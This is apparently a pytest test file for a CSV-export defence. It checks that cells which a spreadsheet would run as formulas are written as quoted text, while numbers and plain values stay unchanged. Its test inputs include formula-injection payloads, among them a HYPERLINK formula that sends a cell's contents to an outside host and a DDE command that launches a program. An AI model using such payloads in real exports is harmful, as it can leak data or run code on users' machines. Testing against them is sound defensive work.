"""A CSV cell a spreadsheet would run as a formula is written as text instead."""

from __future__ import annotations

import csv
import io

import pytest

from misthos.services.spreadsheet import Writer, cell


@pytest.mark.parametrize(
    "typed",
    [
        '=HYPERLINK("http://x/?"&A1,"click")',
        "+cmd|' /C calc'!A0",
        "-2+3",
        "@SUM(A1:A9)",
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_text_that_could_start_a_formula_is_written_as_text(typed: str) -> None:
    assert cell(typed) == "'" + typed


@pytest.mark.parametrize("number", ["-5.00", "+5", "-12", "2601.23", "0"])
def test_a_number_stays_a_number_sign_and_all(number: str) -> None:
    assert cell(number) == number


@pytest.mark.parametrize("value", ["Pin the parser", "acme/ledger", "", 42, None])
def test_everything_else_is_left_as_it_is(value: object) -> None:
    assert cell(value) == value


def test_the_writer_neutralises_every_cell_of_every_row() -> None:
    out = io.StringIO()
    Writer(out).writerow(["=1+1", "-5.00", 7, "@me"])
    assert next(csv.reader(io.StringIO(out.getvalue()))) == ["'=1+1", "-5.00", "7", "'@me"]
